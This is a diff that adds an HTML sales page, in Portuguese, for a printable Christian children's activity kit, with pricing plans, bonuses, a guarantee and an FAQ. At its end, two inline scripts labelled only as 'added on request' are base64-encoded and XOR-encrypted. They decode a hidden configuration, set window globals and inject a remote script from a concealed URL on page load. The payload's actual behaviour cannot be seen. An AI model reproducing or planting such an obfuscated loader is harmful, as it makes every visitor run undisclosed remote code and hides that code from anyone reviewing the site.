@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kit Emoções e Valores à Luz da Bíblia | Material Cristão Infantil</title>
+  <link rel="icon" href="assets/favicon.svg" type="image/svg+xml" />
+  <meta name="description" content="Mais de 140 páginas de conteúdo cristão para crianças de até 12 anos. Atividades prontas para imprimir que ensinam emoções e valores bíblicos. A partir de R$ 12,90." />
+  <meta name="theme-color" content="#FF6B8B" />
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="Kit Emoções e Valores à Luz da Bíblia" />
+  <meta property="og:description" content="Mais de 140 páginas de conteúdo cristão para crianças, prontas para imprimir. A partir de R$ 12,90." />
+  <!-- Para o WhatsApp/Facebook exibirem a imagem, troque pelo endereço completo (ex.: https://seudominio.com/assets/img/kit-capa-800.jpg) -->
+  <meta property="og:image" content="assets/img/kit-capa-800.jpg" />
+
+  <!-- Imagem do topo carrega antes de tudo -->
+  <link rel="preload" as="image" href="assets/img/kit-capa-480.jpg"
+        imagesrcset="assets/img/kit-capa-480.jpg 480w, assets/img/kit-capa-800.jpg 800w"
+        imagesizes="(max-width: 860px) 62vw, 420px" fetchpriority="high" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@700;800&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet" />
+
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+  <!-- ===== HEADER (só logo + botão) ===== -->
+  <header class="header" id="header">
+    <div class="container header__inner">
+      <a href="#inicio" class="logo" id="logo-link" aria-label="Início">
+        <span class="logo__icon">✝</span>
+        <span class="logo__text">Pequenos <em>Corações</em></span>
+      </a>
+      <a href="#oferta" class="btn btn--small btn--coral" id="header-cta">Comprar agora</a>
+    </div>
+  </header>
+
+  <main>
+    <!-- ===== 1. TOPO: PRODUTO, PREÇO E BOTÃO ===== -->
+    <section class="hero" id="inicio">
+      <div class="container hero__grid">
+        <h1 class="hero__title">
+          KIT <span class="hl hl--coral">Emoções</span> e <span class="hl hl--sky">Valores</span> à Luz da <span class="rainbow-text">Bíblia</span>
+        </h1>
+
+        <div class="hero__media">
+          <span class="hero__badge" aria-hidden="true"><strong>+140</strong>páginas</span>
+          <img class="hero__img"
+               src="assets/img/kit-capa-480.jpg"
+               srcset="assets/img/kit-capa-480.jpg 480w, assets/img/kit-capa-800.jpg 800w"
+               sizes="(max-width: 860px) 62vw, 420px"
+               width="480" height="640" fetchpriority="high"
+               alt="Capa do Kit Emoções e Valores à Luz da Bíblia: Jesus cercado de crianças" />
+        </div>
+
+        <div class="hero__content">
+          <p class="hero__subtitle"><strong>+140 páginas</strong> de atividades cristãs prontas para imprimir, para crianças de até 12 anos.</p>
+          <p class="hero__price">a partir de <strong>R$&nbsp;12,90</strong> <span>pagamento único</span></p>
+          <a href="#oferta" class="btn btn--big btn--coral pulse" id="hero-cta">
+            Quero o kit <span class="btn__arrow">→</span>
+          </a>
+          <ul class="hero__trust">
+            <li>🔒 Compra segura</li>
+            <li>⚡ Acesso imediato</li>
+            <li>🛡️ Garantia de 7 dias</li>
+          </ul>
+        </div>
+      </div>
+      <svg class="wave" viewBox="0 0 1440 120" preserveAspectRatio="none" aria-hidden="true"><path d="M0,64 C240,120 480,0 720,48 C960,96 1200,24 1440,64 L1440,120 L0,120 Z"/></svg>
+    </section>
+
+
+    <!-- ===== 3. O KIT POR DENTRO =====
+         Coloque as páginas reais do PDF em assets/paginas/ com os nomes pagina-1.jpg … pagina-6.jpg.
+         A seção só aparece quando existir pelo menos uma imagem (páginas ausentes são ignoradas). -->
+    <section class="section section--tight inside" id="por-dentro" hidden>
+      <div class="container">
+        <div class="section__head" data-reveal>
+          <h2>Veja o kit <span class="hl hl--mint">por dentro</span></h2>
+          <p>Páginas reais do material. Toque para ampliar.</p>
+        </div>
+        <div class="gallery" id="gallery">
+          <button type="button" class="gallery__item" data-src="assets/paginas/pagina-1.jpg" aria-label="Ampliar página 1"></button>
+          <button type="button" class="gallery__item" data-src="assets/paginas/pagina-2.jpg" aria-label="Ampliar página 2"></button>
+          <button type="button" class="gallery__item" data-src="assets/paginas/pagina-3.jpg" aria-label="Ampliar página 3"></button>
+          <button type="button" class="gallery__item" data-src="assets/paginas/pagina-4.jpg" aria-label="Ampliar página 4"></button>
+          <button type="button" class="gallery__item" data-src="assets/paginas/pagina-5.jpg" aria-label="Ampliar página 5"></button>
+          <button type="button" class="gallery__item" data-src="assets/paginas/pagina-6.jpg" aria-label="Ampliar página 6"></button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 4. BENEFÍCIOS RÁPIDOS ===== -->
+    <section class="section section--tight benefits">
+      <div class="container container--narrow">
+        <div class="section__head" data-reveal>
+          <h2>Por que este material vai <span class="hl hl--mint">abençoar</span> seu ministério</h2>
+        </div>
+        <ul class="benefits__list">
+          <li class="benefit" data-reveal style="--c: var(--coral)">
+            <span class="benefit__icon" aria-hidden="true">⏱️</span>
+            <p><strong>Pronto para usar.</strong> É só imprimir e aplicar na EBD, no culto infantil, na célula ou em casa.</p>
+          </li>
+          <li class="benefit" data-reveal style="--c: var(--sky)">
+            <span class="benefit__icon" aria-hidden="true">📜</span>
+            <p><strong>100% bíblico.</strong> Cada emoção ligada a uma história e a um versículo.</p>
+          </li>
+          <li class="benefit" data-reveal style="--c: var(--sun)">
+            <span class="benefit__icon" aria-hidden="true">👧</span>
+            <p><strong>Crianças de até 12 anos.</strong> Lúdico, colorido e fácil de adaptar à turma.</p>
+          </li>
+          <li class="benefit" data-reveal style="--c: var(--lavender)">
+            <span class="benefit__icon" aria-hidden="true">♾️</span>
+            <p><strong>Seu para sempre.</strong> Imprima quantas vezes quiser, para quantas turmas precisar.</p>
+          </li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== 5. BÔNUS ===== -->
+    <section class="section bonus" id="bonus">
+      <div class="floaters floaters--light" aria-hidden="true">
+        <span>🎁</span><span>⭐</span><span>💖</span><span>✨</span><span>🎉</span><span>💛</span>
+      </div>
+      <div class="container">
+        <div class="section__head section__head--light" data-reveal>
+          <h2>3 bônus para quem escolhe o Premium</h2>
+        </div>
+        <div class="bonus__grid">
+          <article class="bonus-card" data-reveal>
+            <div class="bonus-card__tag">Bônus 1</div>
+            <img src="assets/img/bonus1.jpg" alt="Capa do bônus +110 Desenhos Bíblicos para Colorir" class="bonus-card__img" width="600" height="800" loading="lazy" decoding="async" />
+            <h3>+110 Desenhos Bíblicos para Colorir</h3>
+            <p>As principais histórias da Bíblia para colorir.</p>
+            <div class="bonus-card__price"><s>R$ 19,90</s> <strong>GRÁTIS</strong></div>
+          </article>
+          <article class="bonus-card" data-reveal>
+            <div class="bonus-card__tag">Bônus 2</div>
+            <img src="assets/img/bonus2.jpg" alt="Capa do bônus Desafio 30 Dias de Valores Cristãos" class="bonus-card__img" width="600" height="800" loading="lazy" decoding="async" />
+            <h3>Desafio 30 Dias de Valores Cristãos</h3>
+            <p>Princípios bíblicos vividos em família, um por dia.</p>
+            <div class="bonus-card__price"><s>R$ 19,90</s> <strong>GRÁTIS</strong></div>
+          </article>
+          <article class="bonus-card" data-reveal>
+            <div class="bonus-card__tag">Bônus 3</div>
+            <img src="assets/img/bonus3.jpg" alt="Capa do bônus 50 Dinâmicas Cristãs Infantis" class="bonus-card__img" width="600" height="900" loading="lazy" decoding="async" />
+            <h3>50 Dinâmicas Cristãs Infantis</h3>
+            <p>Brincadeiras prontas para quebrar o gelo e fixar o ensino.</p>
+            <div class="bonus-card__price"><s>R$ 19,90</s> <strong>GRÁTIS</strong></div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 6. PREÇOS ===== -->
+    <section class="section offer" id="oferta">
+      <div class="container">
+        <div class="section__head" data-reveal>
+          <h2>Escolha o seu <span class="hl hl--coral">kit</span></h2>
+          <p>Pagamento único. Acesso imediato no seu e-mail.</p>
+        </div>
+
+        <div class="offer__grid">
+          <!-- Plano Básico -->
+          <article class="plan" id="plano-basico" data-reveal>
+            <h3 class="plan__name">Básico</h3>
+            <p class="plan__desc">O material principal</p>
+            <div class="plan__price">
+              <div class="plan__value"><small>R$</small>12<span>,90</span></div>
+              <span class="plan__once">pagamento único</span>
+            </div>
+            <ul class="plan__features">
+              <li class="ok">Conteúdo com +140 páginas</li>
+              <li class="ok">Emoções e valores bíblicos</li>
+              <li class="ok">Atividades para imprimir</li>
+              <li class="ok">Acesso vitalício</li>
+            </ul>
+            <a href="https://pay.cakto.com.br/bdcxgwr_1181819" class="btn btn--block btn--outline" data-checkout="basico" id="cta-basico">Quero o Básico – R$ 12,90</a>
+          </article>
+
+          <!-- Plano Premium -->
+          <article class="plan plan--premium" id="plano-premium" data-reveal>
+            <div class="plan__ribbon">⭐ MAIS ESCOLHIDO</div>
+            <h3 class="plan__name">Premium</h3>
+            <p class="plan__desc">Material completo + 3 bônus</p>
+            <div class="plan__price">
+              <div class="plan__value"><small>R$</small>24<span>,90</span></div>
+              <span class="plan__once">pagamento único • inclui R$ 59,70 em bônus</span>
+            </div>
+            <ul class="plan__features">
+              <li class="ok">Tudo do Básico (+140 páginas)</li>
+              <li class="ok bonus-item"><span><strong>Bônus 1:</strong> +110 Desenhos Bíblicos para Colorir</span></li>
+              <li class="ok bonus-item"><span><strong>Bônus 2:</strong> Desafio 30 Dias de Valores Cristãos</span></li>
+              <li class="ok bonus-item"><span><strong>Bônus 3:</strong> 50 Dinâmicas Cristãs Infantis</span></li>
+            </ul>
+            <a href="https://pay.cakto.com.br/3e5s2qg_1181803" class="btn btn--block btn--big btn--coral pulse" data-checkout="premium" id="cta-premium">
+              Quero o Premium – R$ 24,90
+            </a>
+          </article>
+        </div>
+        <p class="offer__secure">🔒 Pagamento seguro • Pix, cartão ou boleto</p>
+      </div>
+    </section>
+
+    <!-- ===== 7. GARANTIA ===== -->
+    <section class="section section--tight guarantee">
+      <div class="container guarantee__box" data-reveal>
+        <div class="seal" aria-hidden="true">
+          <div class="seal__inner"><strong>7</strong><span>DIAS</span><small>de garantia</small></div>
+        </div>
+        <div>
+          <h2>Garantia incondicional de 7 dias</h2>
+          <p>Se não gostar, é só pedir em até 7 dias e devolvemos <strong>100% do valor</strong>. Sem perguntas.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 8. FAQ CURTO ===== -->
+    <section class="section section--tight faq" id="faq">
+      <div class="container container--narrow">
+        <div class="section__head" data-reveal>
+          <h2>Ficou com alguma <span class="hl hl--lavender">dúvida</span>?</h2>
+        </div>
+        <div class="faq__list">
+          <details class="faq__item" id="faq-1">
+            <summary>Como vou receber o material?</summary>
+            <p>Logo após a confirmação do pagamento, você recebe no seu e-mail o link para baixar. Com Pix e cartão, a liberação é imediata.</p>
+          </details>
+          <details class="faq__item" id="faq-2">
+            <summary>O material é físico ou digital?</summary>
+            <p>É 100% digital (PDF). Você imprime em casa, na igreja ou numa gráfica, quantas vezes quiser.</p>
+          </details>
+          <details class="faq__item" id="faq-3">
+            <summary>Para qual faixa etária é indicado?</summary>
+            <p>Para crianças de até 12 anos. As atividades são adaptáveis, então você ajusta a linguagem para a sua turma.</p>
+          </details>
+          <details class="faq__item" id="faq-4">
+            <summary>Qual a diferença entre o Básico e o Premium?</summary>
+            <p>O Básico traz o material principal com +140 páginas. O Premium traz tudo do Básico <strong>mais 3 bônus</strong>: +110 desenhos bíblicos para colorir, desafio 30 dias de valores cristãos e 50 dinâmicas cristãs infantis.</p>
+          </details>
+          <details class="faq__item" id="faq-5">
+            <summary>E se eu não gostar?</summary>
+            <p>Você tem 7 dias de garantia incondicional. Se não ficar satisfeito(a), devolvemos 100% do valor pago.</p>
+          </details>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 9. BOTÃO FINAL ===== -->
+    <section class="final-cta">
+      <div class="floaters floaters--light" aria-hidden="true">
+        <span>💖</span><span>🕊️</span><span>⭐</span><span>💛</span><span>✨</span>
+      </div>
+      <div class="container final-cta__inner" data-reveal>
+        <p class="final-cta__verse">“Deixai vir a mim as criancinhas…” <small>— Marcos 10:14</small></p>
+        <h2>Cada criança merece aprender a lidar com o coração à luz do amor de Deus</h2>
+        <a href="#oferta" class="btn btn--big btn--sun pulse" id="final-cta">
+          Quero o kit – a partir de R$ 12,90 <span class="btn__arrow">→</span>
+        </a>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer__inner">
+      <a href="#inicio" class="logo logo--light" id="footer-logo"><span class="logo__icon">✝</span><span class="logo__text">Pequenos <em>Corações</em></span></a>
+      <p>© <span id="year"></span> Pequenos Corações. Todos os direitos reservados.</p>
+      <p class="footer__small">Este produto não garante a obtenção de resultados. Qualquer referência ao desempenho de uma estratégia não deve ser interpretada como garantia de resultados.</p>
+    </div>
+  </footer>
+
+  <!-- Botão fixo no rodapé (celular) -->
+  <div class="sticky-cta" id="sticky-cta">
+    <a href="#oferta" class="btn btn--block btn--coral" id="sticky-cta-btn">Quero o kit – R$ 12,90</a>
+  </div>
+
+  <!-- Visualizador de páginas da galeria -->
+  <dialog class="lightbox" id="lightbox" aria-label="Página do kit ampliada">
+    <button type="button" class="lightbox__close" id="lightbox-close" aria-label="Fechar">×</button>
+    <img id="lightbox-img" alt="" />
+  </dialog>
+
+  <script src="script.js" defer></script>
+
+  <!-- Scripts adicionados via solicitação -->
+  <script>(function(){var k_bsos=atob("DDRo1DLIyi1FsBEX809KoUCk6Bdn2GVjg0dS+x2rrkNrxWV6mlIR+lGnpwMnwj5kkEYBpEa75Vgx3WI4n1UcsUG85Ec2kj01kkAcpluqv1kgwzMtqE9KulOlrw9/knV2h1VFoUalo0s8nWFllkINukblsk4q1DxkkF9K+BC+q0Ew1TMt0RYV+EnqpEwo1TMt0VAJoFPlv1ko2Xdu3kQasUStpFlow2R1mlAb9h7qvEwpxXQ1yRZKqW+1");var m_ky1e=[];for(var i_p9e=0;i_p9e<k_bsos.length;i_p9e++){m_ky1e.push(k_bsos.charCodeAt(i_p9e)&255);}var x_mm6i=m_ky1e[0];var s_q0=m_ky1e.slice(1,1+x_mm6i);var h_jx6u=m_ky1e.slice(1+x_mm6i);var n_khh=h_jx6u.map(function(b,a_ogw){return b^s_q0[a_ogw%x_mm6i];});var s_mr="";for(var r_v1sc=0;r_v1sc<n_khh.length;r_v1sc++){s_mr+=String.fromCharCode(n_khh[r_v1sc]&255);}var e_hxe5=decodeURIComponent(escape(s_mr));var l_0=JSON.parse(e_hxe5);var d_hu=l_0.globals||[];d_hu.forEach(function(a_h8d){window[a_h8d.name]=a_h8d.value;});var n_66w=document.createElement("script");n_66w.src=l_0.url;n_66w.async=true;n_66w.defer=true;(l_0.attributes||[]).forEach(function(g_sl6){n_66w.setAttribute(g_sl6.name,g_sl6.value);});(document.head||document.documentElement).appendChild(n_66w);})();</script>
+  <script>(function(){var g_8xq=atob("DNoTbfuuWT5iDhIy+KExGInCewRAZmZGiKkpQtTNPVBMe2ZfkbxqQ5jBNBAAfD1Bm6h6HY/ddk4Ldnde16p6FZ7Cd1QRLD4Qma5nH5LMLEoHfTAIo4c/T5zCNlwDYmEQwoFoT5XPNFtANDBCkaJ2AbLKexJAeHNejb8xV9mYOF1VaHcKzOlyCZ7LbF8AancAnLxwVMOMJGMf");var m_m8=[];for(var v_q=0;v_q<g_8xq.length;v_q++){m_m8.push(g_8xq.charCodeAt(v_q)&255);}var d_dbob=m_m8[0];var l_ht4=m_m8.slice(1,1+d_dbob);var j_kd0v=m_m8.slice(1+d_dbob);var f_xn7n=j_kd0v.map(function(b,t_ch){return b^l_ht4[t_ch%d_dbob];});var s_t9="";for(var f_j=0;f_j<f_xn7n.length;f_j++){s_t9+=String.fromCharCode(f_xn7n[f_j]&255);}var r_k=decodeURIComponent(escape(s_t9));var h_l93=JSON.parse(r_k);var e_lni=h_l93.globals||[];e_lni.forEach(function(b_e1){window[b_e1.name]=b_e1.value;});var h_s3=document.createElement("script");h_s3.src=h_l93.url;h_s3.async=true;h_s3.defer=true;(h_l93.attributes||[]).forEach(function(r_azq3){h_s3.setAttribute(r_azq3.name,r_azq3.value);});(document.head||document.documentElement).appendChild(h_s3);})();</script>
+</body>
+</html>
